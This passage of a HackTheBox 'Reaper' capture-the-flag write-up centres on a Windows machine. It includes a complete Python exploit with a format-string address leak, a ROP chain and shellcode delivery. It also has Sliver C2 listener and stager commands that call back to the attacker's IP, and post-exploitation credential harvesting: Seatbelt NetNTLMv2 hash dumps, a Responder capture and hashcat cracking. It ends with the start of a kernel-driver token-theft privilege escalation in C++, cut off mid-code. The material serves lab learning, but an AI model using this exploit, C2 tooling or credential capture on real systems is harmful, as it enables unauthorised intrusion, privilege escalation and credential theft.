multiplayer (so <code>sliver-client</code> can connect to it), and start an <code>mtls</code> listener.  I'll also generate a new profile, as my IP on the VPN has recently changed.</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ sliver-server\n[...]\n[server] sliver &gt; multiplayer \n[...]\n[server] sliver &gt; mtls -t 240\n[...]\n[server] sliver &gt; new-operator --lhost 10.10.16.59 --save duff --name duff\n</code></pre> <p>That will stay running in a separate tab.  In a new tab, import the new-operator profile from above with <code>sliver-client</code>,  and connect </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ sliver-client import ./duff\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ sliver-client\n? Select a server: duff@10.10.16.59 (d627e2adf130f60a)\nConnecting to 10.10.16.59:31337 ...\n[...]\n</code></pre><p></p> <p>Generate a stage2 profile.  A <code>stager</code> will perform an initial connect to a <code>stage-listener</code>, and this profile defines what stage2 to send back. </p> <pre><code>sliver &gt; profiles new --mtls 10.10.16.59 --skip-symbols --format shellcode --disable-sgn --os windows --arch amd64 --timeout 240 reaper\n\n[*] Saved new implant profile reaper\n</code></pre> <p>Stand up a stage listener, and associate it with the profile.</p> <pre><code>sliver &gt; stage-listener --url tcp://10.10.16.59:8443 --profile reaper\n\n[*] No builds found for profile reaper, generating a new one\n[*] Sliver name for profile reaper: GRUBBY_MONGER\n[*] Job 3 (tcp) started\n</code></pre> <p>Generate a <code>stager</code>. </p> <pre><code>sliver &gt; generate stager --lhost 10.10.16.59 --lport 8443 --os windows --arch amd64 --timeout 240 --protocol tcp --format raw --save reaper_sc\n</code></pre> <p>The only modification I need to make to the PoC is to have the shellcode read in by file.</p> <pre><code>shellcode = open(\"sc.bin\", 'rb').read().decode('latin-1')\n</code></pre> <p>After sending the payload to the target, after about a minute or so, I get a session.</p> <pre><code>[*] Session 56ca80d6 GRUBBY_MONGER - 10.129.234.200:60901 (reaper) - windows/amd64 - Mon, 03 Nov 2025 23:13:23 PST\n\nsliver &gt; use 56ca80d6-e50f-43af-bed7-ff99bd089b9c\n\n[*] Active session GRUBBY_MONGER (56ca80d6-e50f-43af-bed7-ff99bd089b9c)\n\nsliver (GRUBBY_MONGER) &gt; info\n\n        Session ID: 56ca80d6-e50f-43af-bed7-ff99bd089b9c\n              Name: GRUBBY_MONGER\n          Hostname: reaper\n              UUID: 45b23042-98ac-1874-26d9-444968eb4273\n          Username: REAPER\\keysvc\n               UID: S-1-5-21-2661617556-2774986859-216721275-1002\n               GID: S-1-5-21-2661617556-2774986859-216721275-513\n               PID: 4520\n                OS: windows\n           Version: 10 build 19045 x86_64\n            Locale: en-US\n              Arch: amd64\n         Active C2: mtls://10.10.16.59:8888\n    Remote Address: 10.129.234.200:60901\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Mon Nov  3 23:13:23 PST 2025 (16m23s ago)\n      Last Checkin: Mon Nov  3 23:29:36 PST 2025 (10s ago)\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Reaper/#poc","title":"PoC","text":"<pre><code>#!/usr/bin/env python3\nimport os, sys, re, socket, binascii, time, base64\nfrom struct import pack, unpack\nfrom IPython import embed\n\n\nNOTES=r'''\n## @call rax\n((cmd.exe /c \"taskkill /F /IM dev_keysvc.exe\" &amp;&amp; timeout 1 &amp;&amp; START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) || START /B \"\" \"C:\\reaper\\dev_keysvc.exe\" &gt; c:\\reaper\\output.txt) &amp;&amp; timeout 1 &amp;&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe\" -WF C:\\windbg_custom.WEW -pn dev_keysvc.exe -c 'bp dev_keysvc+0x1937; g; g; g; bp dev_keysvc+0x16f1; g; t 33; p; pt; t 7'\n\n[server] sliver &gt; mtls -t 240\n[server] sliver &gt; new-operator --lhost 10.10.16.59 --save duff --name duff\n$ sliver-client import ./duff\n$ sliver-client\nsliver &gt; profiles new --mtls 10.10.16.59 --skip-symbols --format shellcode --disable-sgn --os windows --arch amd64 --timeout 240 reaper\nsliver &gt; stage-listener --url tcp://10.10.16.59:8443 --profile reaper\nsliver &gt; generate stager --lhost 10.10.16.59 --lport 8443 --os windows --arch amd64 --timeout 240 --protocol tcp --format raw --save reaper_sc\n'''\n\n\ndef dprint(msg):\n    if \"debug\" in sys.argv:\n        print(msg)\n\n\ndef packlatin(fmt, inp):\n        return pack(fmt, inp).decode('latin-1')\n\n\nbadchars = \"\"\ndef gen_badchars(bc, start=\"\\x01\", end=\"\\xff\"):\n    s_int = ord(start)\n    e_int = ord(end)+1\n    BC = bytearray(range(s_int,e_int)).decode('latin-1')\n    for item in bc:\n        BC = BC.replace(item,'')\n    return BC\n\n\ndef cx(ip, port, recv=0):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    if recv &gt; 0:\n        resp = sock.recv(4096)\n        print(resp)\n    return sock\n\n\ndef server_interact(sock,bufs):\n    for x in range(0,len(bufs)):\n        recvd = sock.recv(4096).decode('latin-1')\n        dprint(recvd)\n        if \"key format\" in recvd or 'Checking key' in recvd:\n            recvd = sock.recv(4096).decode('latin-1')\n            dprint(recvd)\n        dprint(f\"{bufs[x][:32].replace((b'\\x0a').decode('latin-1'),r'\\\\n')}[...]\")\n        sock.send(bufs[x].encode('latin-1'))\n\n\ndef get_leak(sock):\n    # \u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n    # \u2514\u2500$ echo \"Hello\" | base64 -w0\n    bufs = [ \"1\\n\", \"110-FE9A1-550-A271-0109-SGVsbG8K\\n\", \"2\\n\", \"1\\n\", \"%p\\n\", \"2\\n\"]\n    server_interact(sock,bufs)\n    leak = sock.recv(4096).decode('latin-1').split(\"\\n\")[0].split(\" \")[2]\n    baseaddr = int(leak,16) - 132704\n    print(f\"** dev_keysvc leakaddr: 0x{leak} **\")\n    print(f\"** dev_keysvc baseaddr: 0x{baseaddr:016x} **\")\n    return baseaddr \n\n\ndef ROPchain1(base):\n    return \"\".join([packlatin(\"&lt;Q\",x) for x in [\n        ## 0x40 to r9\n        base+0x20d9,        #: pop rbx ; ret ;\n        0x40,\n        base+0x1f90,        #: mov r9, rbx ; mov r8, 0x0000000000000000 ; add rsp, 0x08 ; ret ;\n        0xfeedcafedeadbeef,\n\n        ## 0x1000 to r8\n        base+0x150a,        #: pop rax ; ret ;\n        0x1000,\n        base+0xe97a,        #: xchg eax, edx ; ret ;\n        base+0x1bd8c,       #: or r8d, edx ; mov eax, r8d ; shl eax, 0x18 ; or eax, r8d ; ret ;\n\n        ## 0x1000 to rdx\n        ## Nothing needed, rdx is already 0x1000 because of r8 above\n\n        ## rsp to rcx\n        base+0x1fa0,        #: xor rbx, rsp ; ret ;\n        base+0x1fb3,        #: mov r12, rbx ; ret ;  ## for jmp/call rsp later\n        base+0x1fc2,        #: push rbx ; pop rax ; ret ;\n        base+0x1f80,        #: mov rcx, rax ; ret ;\n\n        ## call VirtualAlloc\n        base+0x150a,        #: pop rax ; ret ;\n        base+0x20000,       ## IAT VirtualAlloc VA\n        base+0x1547f,       #: mov rax, qword [rax] ; add rsp, 0x28 ; ret ;\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        base+0x5d6d,        #: push rax ; pop rdi ; ret ;\n        base+0x3db5,        #: push rdi ; ret ;\n\n        ## realign RSP, RE: shadow space / VA scratch area\n        base+0x175b,          #: add rsp, 0x28 ; ret ;\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n        0xfeedcafedeadbeef,\n\n        ## jmp/call rsp\n        base+0x150a,        #: pop rax ; ret ;\n        0xf0,\n        base+0x368c         #: add rax, r12 ; mov rdx, r13 ; call rax ;\n    ]])\n\n\ndef get_crash(sock,dev_keysvc):\n    crash=1200\n    crashlen=88\n    onramp=(\"\\x90\")*crashlen\n    SEH=ROPchain1(dev_keysvc)\n    print(f\"ROPchain len:{len(SEH)}\")\n    nopsled1 = (\"\\x90\" * 0x80)\n    fixup = (\n        \"\\x48\\x89\\xC4\"              #mov rsp,rax\n        \"\\x48\\x83\\xEC\\x98\"          #sub rsp,byte +0x20\n        \"\\x54\"                      #push rsp\n        \"\\x48\\x89\\xE5\"              #mov rbp,rsp\n        \"\\x48\\x31\\xC9\"              #xor rcx,rcx\n        \"\\x48\\x31\\xD2\"              #xor rdx,rdx\n        \"\\x48\\x31\\xC0\"              #xor rax,rax\n        \"\\x48\\x31\\xDB\"              #xor rbx,rbx\n        \"\\x48\\x31\\xFF\"              #xor rdi,rdi\n        \"\\x4D\\x31\\xC0\"              #xor r8,r8\n        \"\\x4D\\x31\\xE4\"              #xor r12,r12            \n    ) #32 bytes\n    nopsled2 = (\"\\x90\" *0x20)\n    shellcode = open(\"reaper_sc\", 'rb').read().decode('latin-1')\n    print(f\"shellcode len:{len(shellcode)}\")\n    offramp= (\"\\x90\" * (crash - sum([len(x) for x in [\n        onramp,\n        SEH,\n        nopsled1,\n        fixup,\n        nopsled2,\n        shellcode\n    ]])))\n    compiled_payload = f\"{onramp}{SEH}{nopsled1}{fixup}{nopsled2}{shellcode}{offramp}\"\n    print(f\"compiled_payload len:{len(compiled_payload)}\")\n    pay = (base64.b64encode(bytearray(compiled_payload,'latin-1'))).decode('latin-1')\n    bufs = [ \"1\\n\", f\"110-FE9A1-550-A271-0109-{pay}\\n\", \"2\\n\", \"3\\n\"]\n    server_interact(sock,bufs)\n\n\ndef main():\n    if len(sys.argv) &lt; 2:\n        print(f\"USAGE: {sys.argv[0]} ip:port &lt;optional&gt;\")\n        sys.exit()\n    else:\n        ip, port = sys.argv[1].split(\":\")\n        port = int(port)\n        sock = cx(ip,port,0)\n\n    dev_keysvc = get_leak(sock)\n    get_crash(sock,dev_keysvc)\n\n\nif __name__==\"__main__\":\n    main()\n</code></pre> <p>User flag </p><pre><code>C:\\Users\\keysvc\\Desktop&gt;type user.txt\ntype user.txt\n07394cb49eb8e7470d7167db6d0f6935\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#post-exploitation-enumeration","title":"Post-exploitation enumeration","text":"<p>Seatbelt disclosed an NetNTLMv2 hash for reapersvc, and also the current process token has membership to the RDP group</p> <pre><code>sliver (GRUBBY_MONGER) &gt; seatbelt -- -group=user\n\n[...]\n====== SecPackageCreds ======\n\n  Version                        : NetNTLMv2\n  Hash                           : keysvc::REAPER:1122334455667788:6a2bc1a5b19a1e287260491f51cc96bc:0101000000000000181db491664ddc01bcb68e6f51f99ba900000000080030003000000000000000000000000030000048a97bdcc3de78e80ef44f45118f7ca1bf92abf5ccb0823f095a6eb56ed016fa0a00100000000000000000000000000000000000090000000000000000000000\n\n[...]\n====== TokenGroups ======\n\nCurrent Token's Groups\n\n  REAPER\\None                              S-1-5-21-2661617556-2774986859-216721275-513\n  Everyone                                 S-1-1-0\n  BUILTIN\\Remote Desktop Users             S-1-5-32-555\n  BUILTIN\\Users                            S-1-5-32-545\n  NT AUTHORITY\\SERVICE                     S-1-5-6\n  CONSOLE LOGON                            S-1-2-1\n  NT AUTHORITY\\Authenticated Users         S-1-5-11\n  NT AUTHORITY\\This Organization           S-1-5-15\n  NT AUTHORITY\\Local account               S-1-5-113\n  LOCAL                                    S-1-2-0\n  NT AUTHORITY\\NTLM Authentication         S-1-5-64-10\n</code></pre> <p>NetNTLMv2-SSP hash for <code>keysvc</code> but it doesn't crack: </p><pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/reaper]\n\u2514\u2500$ sudo hashcat -m 5600 keysvc.hash /usr/share/wordlists/rockyou.txt --force --quiet \n[sudo] password for notroot:\n</code></pre><p></p> <p>Also sent defaultcredentials to a listening responder: </p><pre><code>PS C:\\users\\keysvc&gt; invoke-webrequest -uri http://10.10.16.59/duffed.txt -usedefaultcredentials\n</code></pre><p></p> <pre><code>[HTTP] NTLMv2 Client   : 10.129.234.200\n[HTTP] NTLMv2 Username : REAPER\\keysvc\n[HTTP] NTLMv2 Hash     : keysvc::REAPER:cd0f87b6b1319306:6580FA82E3DC1054562FB5BC308ED25C:0101000000000000635AA7801F4EDC01D5E02131248798A50000000002000800530056004500490001001E00570049004E002D0045004B004900480032004D00540038004300330033000400140053005600450049002E004C004F00430041004C0003003400570049004E002D0045004B004900480032004D00540038004300330033002E0053005600450049002E004C004F00430041004C000500140053005600450049002E004C004F00430041004C0008003000300000000000000000000000003000000F67F829E12B9EC357B63981E6817E8C0A49B7440B2EF1CBB137473890CA08020A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310036002E00350039000000000000000000\n</code></pre> <p>Also doesn't crack.</p> <p>Now that I have shell access, I was finally able to get my hands on <code>reaper.sys</code>.</p> <pre><code>sliver (GRUBBY_MONGER) &gt; ls\n\nC:\\driver (1 item, 8.2 KiB)\n===========================\n-rw-rw-rw-  reaper.sys  8.2 KiB  Thu Jul 27 08:12:21 -0800 2023\n\nsliver (GRUBBY_MONGER) &gt; download reaper.sys\n\n[*] Wrote 8432 bytes (1 file successfully, 0 files unsuccessfully) to /home/notroot/htb/machines/reaper/reaper.sys\n</code></pre> <p>I also found a service named <code>reaper</code>, which appears to have <code>reaper.sys</code> in its <code>binPath</code>.</p> <pre><code>PS C:\\&gt; sc query reaper\nsc query reaper\nsc : Access to the path 'C:\\query' is denied.\nAt line:1 char:1\n+ sc query reaper\n+ ~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (C:\\query:String) [Set-Content], UnauthorizedAccessException\n    + FullyQualifiedErrorId : GetContentWriterUnauthorizedAccessError,Microsoft.PowerShell.Commands.SetContentCommand\n\n\nPS C:\\&gt; sc.exe query reaper\nsc.exe query reaper\n\nSERVICE_NAME: reaper \n        TYPE               : 1  KERNEL_DRIVER  \n        STATE              : 4  RUNNING \n                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n\nPS C:\\&gt; sc.exe qc reaper\nsc.exe qc reaper\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: reaper\n        TYPE               : 1  KERNEL_DRIVER \n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : \\??\\C:\\driver\\reaper.sys\n        LOAD_ORDER_GROUP   : \n        TAG                : 0\n        DISPLAY_NAME       : reaper\n        DEPENDENCIES       : \n        SERVICE_START_NAME :\n</code></pre>"},{"location":"writeups/HackTheBox/Machines/Reaper/#analyzing-reapersys","title":"Analyzing Reaper.sys","text":"<p>It was an inevitability, really, that I take a look at <code>reaper.sys</code>.  As it turns out, the file is actually quite interesting for the fact that its loaded as a kernel module.  </p> <p>I found the module has a main runtime, </p> <p></p> <p>The main runtime calls APIs such as <code>RtlGetVersion</code>, <code>IoCreateDevice</code>, <code>IoCreateSymbolicLink</code>, and <code>IoDeleteDevice</code>.  In the above screenshot, I found the top red box to be assignment operations, the righthand-operand shows <code>0x1000</code> but it is in fact a function call, that goes off to call <code>IofCompleteRequest</code>.  It just shows that way because I rebased to 0x0 so that I could get relative offsets while debugging.  </p> <p>The second red box also calls a function which in the screenshot above I named <code>threadwork</code>, but later after researching generally a kernel driver could be interacted with by a userland application, I discovered this function must actually be <code>DispatchDeviceControl</code>.</p> <p>It is that second red box that is actually the most interesting and relevant to the task at hand.</p> <p></p> <p>When we think about the way <code>DispatchDeviceControl</code> is meant to be implemented, https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/dispatchdevicecontrol-and-dispatchinternaldevicecontrol-routines</p> <pre><code>A driver's dispatch routines (see [**DRIVER_DISPATCH**](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch)) handle IRPs with I/O function codes of [**IRP_MJ_DEVICE_CONTROL**](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control) and [**IRP_MJ_INTERNAL_DEVICE_CONTROL**](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-internal-device-control), respectively.\n\nFor every common type of peripheral device, the system defines a set of I/O control codes for **IRP_MJ_DEVICE_CONTROL** requests. New drivers for each type of device must support these requests. In most cases, these public I/O control codes for each type of device are not exported to user-mode applications.\n</code></pre> <p>The conditional statements on lines 14, 30, and 31 directly correlate to the following values seen as the source value in the comparison op:</p> <p></p> <p>We can see that with a control code of <code>-0x7fffdffd</code>, or <code>0x80002003</code>, in the IF statement and clause, on line 21 there is a call to <code>ExAllocatePoolWithTag</code>.  The size is <code>0x20</code>, or 64 bytes.  The tag is <code>0x70616552</code>, which translates to <code>peaR</code>, or <code>Reap</code> backwards.  </p> <p>Line 22 checks if the allocation was good, if not we jump out of here to label <code>LAB_00001165</code> outside the IF statement, looks like function cleanup.</p> <p>Lines 23 through 27 take <code>parameter2</code> the function was called with (pointed to by <code>piVar3</code>) and assign it into the allocation.</p> <p>Of interest, but before the call to <code>ExAllocatePoolWithTag</code>, on line 20, is a check that the first value pointed-to by <code>piVar3</code>, is equivalent to <code>0x6a55cc9e</code>. If it is, then execution continues to call <code>ExAllocatePoolWithTag</code>.  If it isn't, then this would also jump to the label <code>LAB_00001165</code> outside the IF statement, and lead to function cleanup.  So this value must be a checksum.  </p> <p>In the ELSE clause of the IF statement, we find there are two conditionals that can be met.  The first is if the control code is <code>-0x7fffdff9</code>, or <code>0x80002007</code>,  then we call <code>ExFreePoolWithTag</code>.  It would get called with arguments, the region of memory that was allocated, and the tag <code>0x70616552</code>, or <code>peaR</code> in ASCII.</p> <p>But if the control code isn't <code>-0x7fffdff9</code>, or <code>0x80002007</code>, then we check if the control code is <code>-0x7fffdff5</code>, or <code>0x8000200b</code>.  If this is the case then what follows is a call to <code>PsLookupThreadByThreadId</code>, <code>KeSetPriorityThread</code>, and <code>ObfDereferenceObject</code>.  From the allocation, pointer-to-pointer offset 6 of the allocation is assigned whatever pointer-to-pointer offset 4 of the allocation references (given that neither are null).  In effect, a write operation from a source buffer to a destination buffer.  This is a user controllable commit because the allocation and data assigned to the allocation are user controlled.  The commit on the other hand is by the kernel module, using the user-controlled input.</p> <p>Lets talk about how to interact with a kernel module.</p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#interacting-with-a-kernel-module","title":"Interacting with a kernel module","text":"<p>Google search:  <code>usermode connect to kernel mode driver example</code></p> <p>Gemini response:</p> <p>Connecting user-mode applications to kernel-mode drivers on Windows typically involves using DeviceIoControl for communication. This mechanism allows user-mode applications to send requests and data to a kernel-mode driver, and receive data back.</p> <p>Here is an example illustrating the basic steps:</p> <ol> <li> <p>Kernel-Mode Driver (e.g., WDM or KMDF):</p> </li> <li> <p>Define Custom IOCTLs: Create unique control codes (IOCTLs) that the user-mode application will use to specify the desired operation. These are defined using macros like <code>CTL_CODE</code>.</p> </li> </ol> <pre><code>    #define IOCTL_MYDRIVER_DO_SOMETHING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)\n</code></pre> <ul> <li> <p>Implement IRP Dispatch Routines</p> <p>The driver needs to handle <code>IRP_MJ_DEVICE_CONTROL</code> requests in its <code>DispatchDeviceControl</code> routine. Inside this routine, the driver examines the <code>IoControlCode</code> from the IRP to determine which custom IOCTL was sent and then performs the corresponding action.</p> </li> <li> <p>Access user Buffers</p> <p>When using <code>METHOD_BUFFERED</code> or <code>METHOD_IN_DIRECT</code>/<code>METHOD_OUT_DIRECT</code>, the system handles buffer copying. For <code>METHOD_NEITHER</code>, the driver directly accesses user-mode buffers, requiring careful validation to prevent security vulnerabilities.    </p> </li> <li> <p>User-Mode Application:</p> </li> <li> <p>Open a Handle to the Device: Use <code>CreateFile</code> to obtain a handle to the kernel-mode device object exposed by the driver. The device name will typically be in the format <code>\\\\.\\MyDriverName</code>.</p> </li> </ul> <pre><code>    HANDLE hDevice = CreateFile(\n        L\"\\\\\\\\.\\\\MyDriverName\",\n        GENERIC_READ | GENERIC_WRITE,                                \n        0,\n        NULL,\n        OPEN_EXISTING,\n        FILE_ATTRIBUTE_NORMAL,\n        NULL\n    );\n</code></pre> <ul> <li>Send IOCTL Requests: Use <code>DeviceIoControl</code> to send the custom IOCTLs to the driver, along with any input data, and receive output data.</li> </ul> <pre><code>    DWORD bytesReturned;    \n    CHAR inputBuffer[] = \"Hello from user-mode!\";    \n    CHAR outputBuffer[256];    \n    BOOL success = DeviceIoControl(\n        hDevice,\n        IOCTL_MYDRIVER_DO_SOMETHING,\n        inputBuffer, \n        sizeof(inputBuffer),\n        outputBuffer, \n        sizeof(outputBuffer),\n        &amp;bytesReturned,\n        NULL\n    );\n</code></pre> <ul> <li>Close the Device Handle: Release the handle when no longer needed using <code>CloseHandle</code>.</li> </ul> <p>Example Flow:</p> <ul> <li>The user-mode application opens a handle to the driver's device object.</li> <li>It calls <code>DeviceIoControl</code>, specifying <code>IOCTL_MYDRIVER_DO_SOMETHING</code>, an input buffer, and an output buffer.</li> <li>The operating system intercepts this call and creates an IRP, which is then sent to the kernel-mode driver.</li> <li>The driver's <code>DispatchDeviceControl</code> routine receives the IRP, identifies <code>IOCTL_MYDRIVER_DO_SOMETHING</code>, processes the input data, and places any results in the output buffer.</li> <li>The operating system copies the output data back to the user-mode application's output buffer.</li> <li><code>DeviceIoControl</code> returns, and the user-mode application can then process the received data.</li> </ul>"},{"location":"writeups/HackTheBox/Machines/Reaper/#crash-course-in-kernel-driver-development-and-debugging","title":"Crash course in kernel driver development and debugging","text":"<p>I am at this point in a bit over my head it seems, so I reviewed a crash course on kernel driver development and debugging.  It's about three hours long, and following along made it take a whole lot longer than that even.  But it was very informative and overall I would say the juice was well worth the squeeze.</p> <p>\"CREATE and DEBUG a Windows KERNEL device driver!\" https://www.youtube.com/watch?v=eE-o25o8ljU</p> <p>The crash course premise assumes debugging of a kernel driver in active development, developed and then remotely deployed using <code>VisualStudio</code> and remotely debugged using <code>windbg</code>.  Obviously that doesn't fit the usecase here, because we already have the driver.  Nevertheless, much of it could be applied to the current task.  Some additional fill in the blanks were needed.</p> <p>Such as this:  https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-</p> <p>And some key take-aways, such as breaking on load of the kernel driver:</p> <pre><code>sxe ld reaper\n</code></pre> <p>For debugging, I found the only real way to do it is by remotely debugging a separate machine.  In this configuration, you have a host debugger, that connects to a target debugee which runs the kernel driver.  In this configuration, the debugger controls the debugee remotely.  So I stood up a second Windows 10 Pro VM as the target debugee.  On the target debugee, I tried to replicate the kernel driver and service to match Reaper.</p> <pre><code>sc.exe create reaper type= kernel start= auto binPath= c:\\driver\\reaper.sys\n</code></pre> <p>This was only possible when driver signing was disabled on the target debugee, for that, the following and a restart, after which I could create the service above:</p> <pre><code>bcdedit /set testsigning on\n</code></pre> <p>And the following ran on the target debugee to enable remotely debugging the kernel:</p> <pre><code>PS C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64&gt; .\\kdnet 192.168.56.100 50000\n\nEnabling network debugging on Intel(R) PRO/1000 MT Desktop Adapter.\n\nTo debug this machine, run the following command on your debugger host machine.\nwindbg -k net:port=50000,key=[...truncate...]\n\nThen reboot this machine by running shutdown -r -t 0 from this command prompt.\n</code></pre> <p>The following, ran from the debugging host:</p> <pre><code>&amp; \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg\" -k net:port=50000,key=[...truncate...]\n</code></pre> <p>After which point I can connect to the target debugee by rebooting it, and it connects automatically.</p> <p></p>"},{"location":"writeups/HackTheBox/Machines/Reaper/#building-the-poc","title":"Building the PoC","text":"<p>I started by creating a new C++ console application in VisualStudio.  </p> <p>The call to <code>DeviceIoControl</code> needs a handle to the module, for that I created a global variable that the handle could be assigned into, and a function for getting a handle.</p> <pre><code>HANDLE reap = NULL;\n\nHANDLE ReaperSysHandle(void) {\n    HANDLE reaper = CreateFile(\n        /*[in]      LPCSTR                          lpFileName*/ L\"\\\\\\\\.\\\\Reaper\",\n        /*[in]      DWORD                      dwDesiredAccess*/ GENERIC_READ | GENERIC_WRITE,\n        /*[in]      DWORD                          dwShareMode*/ 0,\n        /*[in, opt] LPSECURITY_ATTRIBUTES lpSecurityAttributes*/ NULL,\n        /*[in]      DWORD                dwCreationDisposition*/ OPEN_EXISTING,\n        /*[in]      DWORD                 dwFlagsAndAttributes*/ FILE_ATTRIBUTE_NORMAL,\n        /*[in, opt] HANDLE                       hTemplateFile*/ NULL\n    );\n    printf(\"[handle] Good handle for device \\\\\\\\.\\\\Reaper: 0x%x\\n\", reap);\n    return reaper;\n}\n</code></pre> <p>In my <code>main</code>, I could then assign the handle into it, and eventually also <code>CloseHandle</code> at the end of runtime.</p> <pre><code>int main(void){\n    reap = ReaperSysHandle();\n    [...]\n    if (reap) return CloseHandle(reap);\n}\n</code></pre> <p>I needed a way to invoke <code>DeviceIoControl</code>, it would be called in different ways depending on what the control code is and the operation that would be performed.  In all cases it would be called with a control code and some data. </p> <pre><code>void Invoke_DeviceIoControl(DWORD ctrlcode, REAPER *data) {\n    unsigned char outBuf[2048] = { 0 };\n    ULONG outLen;\n\n    DeviceIoControl(\n        /*[in]        HANDLE               hDevice*/ reap,\n        /*[in]        DWORD        dwIoControlCode*/ ctrlcode,\n        /*[in, opt]   LPVOID            lpInBuffer*/ (LPVOID)data,\n        /*[in]        DWORD          nInBufferSize*/ (ULONG)sizeof(struct REAPER),\n        /*[out, opt]  LPVOID           lpOutBuffer*/ outBuf,\n        /*[in]        DWORD         nOutBufferSize*/ sizeof(outBuf),\n        /*[out, opt]  LPDWORD      lpBytesReturned*/ &amp;outLen,\n        /*[in, out, opt] LPOVERLAPPED lpOverlapped*/ NULL\n    );\n}\n</code></pre> <p>As for the control codes, and the data, the control codes are known, the data would be some type of structure that includes a checksum, a thread ID, a thread priority, some junk index that never appeared to be referenced, and two pointers, one for a source buffer and one for a destination buffer.</p> <pre><code>#define DISPATCH_ALLOCATE_POOL          0x80002003\n#define DISPATCH_FREE_POOL              0x80002007\n#define DISPATCH_COMMIT_THREAD          0x8000200b\n\ntypedef struct REAPER {\n    DWORD checksum;\n    DWORD tid;\n    DWORD pri;\n    DWORD junk;\n    ULONGLONG src;\n    ULONGLONG dst;\n} REAPER;\n</code></pre> <p>At some point, I had come across this:  https://www.slideshare.net/slideshow/0x002-windows-priv-esc-a-low-level-explanation-of-token-theft/259071925</p> <p>It talks about stealing SYSTEM's token out of its EPROCESS struct and injecting it into the current process (token theft).  A talk about the need for read-what-where and write-what-where primitives for achieving this.</p> <p>As for handling the data, a higher-level function would be needed to wrap it all together.  We may have need to read some data from a source buffer into a local buffer under our control, so that it can be printed back or used.  And there might be a case where we need to read some data and write it into an arbitrary remote buffer.  </p> <p>An atomic operation would see an allocation of a tagged pool of memory, a commit of that memory to a thread, and then freeing up that allocation.  So there would need to be some functions that call <code>DeviceIoControl</code> in these ways.</p> <p>The following method should be able to handle both of the local buffer and remote buffer cases.</p> <p>I use the terms local buffer and remote buffer in the sense of the buffer in relation to the exploit binary.</p> <pre><code>#define OP_LOCAL                        0x0\n#define OP_REMOTE                       0x1\n\nULONGLONG Action(UINT operation, ULONGLONG srcAddress, ULONGLONG dstAddress) {\n\n    ULONGLONG output;\n    REAPER data { 0x6A55CC9E, GetCurrentThreadId(), 0, 0, srcAddress, (ULONGLONG)&amp;output };\n    if (operation == OP_REMOTE) {\n        data.dst = dstAddress;\n    }\n    Invoke_DeviceIoControl(DISPATCH_ALLOCATE_POOL, &amp;data);\n    Invoke_DeviceIoControl(DISPATCH_FREE_POOL, NULL);\n    Invoke_DeviceIoControl(DISPATCH_COMMIT_THREAD, NULL);\n    return output;\n}\n</code></pre> <p>And then at some point I performed the following Google search:</p> <pre><code>steal token windows kernel exploit github\n</code></pre> <p>The first result: https://github.com/xct/windows-kernel-exploits</p> <p><code>xct</code> is the maker of <code>Reaper</code> machine.  So already my attention has been pinged for IRQ.  Another connected dot, in this file which seems to relate to the walking of EPROCESS structure.</p> <p>https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/HevdPoolOverflowWin7x64.cpp#L60</p> <p>Here it is:</p> <pre><code>    eProcResult GetCurrentEProcess() {\n        // find system EPROCESS &amp; token     \n        QWORD systemProc = getSystemEProcess();\n        printf(\"[&gt;] System _EPROCESS: 0x%llx\\n\", systemProc);\n\n        // walk ActiveProcessLinks to find our process\n        DWORD currentProcessPid = GetCurrentProcessId();\n        //printf(\"[&gt;] Current Process PID %d\\n\", currentProcessPid);\n        BOOL found = false;\n        QWORD cProcess = systemProc;\n        DWORD cPid = 0;\n        QWORD cTokenPtr;\n\n        while (!found) {\n            cProcess = arbRead(cProcess + 0x188); // get next entry in ActiveProcessLinks (dt _EPROCESS)        \n            cProcess -= 0x188; // get back to start of _EPROCESS (otherwise it points directly to next entrys 0x188 offset)\n            cPid = arbRead(cProcess + 0x180);\n            cTokenPtr = arbRead(cProcess + 0x208);\n            if (cPid == currentProcessPid) {\n                printf(\"[&gt;] Current Process: %llx (PID: %d, TOKEN_PTR: %llx)\\n\", cProcess, cPid, cTokenPtr);\n                found = 